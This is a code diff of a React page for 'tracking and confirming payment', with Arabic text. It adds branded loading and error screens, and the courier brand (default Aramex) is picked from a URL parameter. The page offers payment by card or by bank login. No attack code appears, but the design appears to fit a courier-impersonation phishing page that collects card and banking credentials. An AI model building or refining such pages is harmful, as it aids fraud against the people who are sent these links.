@@ -17,8 +17,8 @@ import {
   Truck,
   Building2,
   ShieldCheck,
+  Loader2,
 } from "lucide-react";
-import FullScreenLoader from "@/components/FullScreenLoader";
 
 type PaymentMethod = "card" | "login";
 
@@ -31,21 +31,53 @@ const PaymentTrackConfirm = () => {
   const [selectedMethod, setSelectedMethod] = useState<PaymentMethod | "">("");
   const [selectedBank, setSelectedBank] = useState<string>("");
 
+  const urlServiceKey = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get("service") : null;
+  const fallbackServiceKey = urlServiceKey || "aramex";
+  const fallbackBranding = getServiceBranding(fallbackServiceKey);
+
   if (isLoading) {
-    return <FullScreenLoader label="جاري تحميل تفاصيل الدفع..." />;
+    return (
+      <DynamicPaymentLayout
+        serviceName={fallbackServiceKey}
+        serviceKey={fallbackServiceKey}
+        amount="..."
+        title="تتبع وتأكيد الدفع"
+        description="جاري تحميل تفاصيل الدفع"
+        icon={<ShieldCheck className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      >
+        <div className="py-12 flex flex-col items-center justify-center text-center">
+          <div
+            className="w-14 h-14 rounded-full flex items-center justify-center mb-4"
+            style={{
+              background: `linear-gradient(135deg, ${fallbackBranding.colors.primary}, ${fallbackBranding.colors.secondary})`,
+            }}
+          >
+            <Loader2 className="w-6 h-6 text-white animate-spin" />
+          </div>
+          <p className="text-sm text-muted-foreground">جاري تحميل تفاصيل الدفع...</p>
+        </div>
+      </DynamicPaymentLayout>
+    );
   }
 
   if (!linkData) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <CreditCard className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-lg font-semibold mb-2">الرابط غير متاح</h2>
+      <DynamicPaymentLayout
+        serviceName={fallbackServiceKey}
+        serviceKey={fallbackServiceKey}
+        amount="..."
+        title="تتبع وتأكيد الدفع"
+        description="تعذر تحميل تفاصيل الدفع"
+        icon={<ShieldCheck className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      >
+        <Card className="p-6 text-center border-destructive/40">
+          <CreditCard className="w-10 h-10 mx-auto mb-3 text-destructive" />
+          <h2 className="text-base font-semibold mb-2">الرابط غير متاح</h2>
           <p className="text-sm text-muted-foreground">
             تعذر العثور على بيانات الدفع. تأكد من صلاحية الرابط أو تواصل مع الدعم.
           </p>
-        </div>
-      </div>
+        </Card>
+      </DynamicPaymentLayout>
     );
   }
 
@@ -53,8 +85,7 @@ const PaymentTrackConfirm = () => {
   const countryData = getCountryByCode(countryCode);
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const urlService = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get("service") : null;
-  const serviceKey = payload.service_key || payload.service || payload.carrier || urlService || "aramex";
+  const serviceKey = payload.service_key || payload.service || payload.carrier || urlServiceKey || "aramex";
   const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const banks = useMemo<Bank[]>(() => getBanksByCountry(countryCode?.toUpperCase() || ""), [countryCode]);
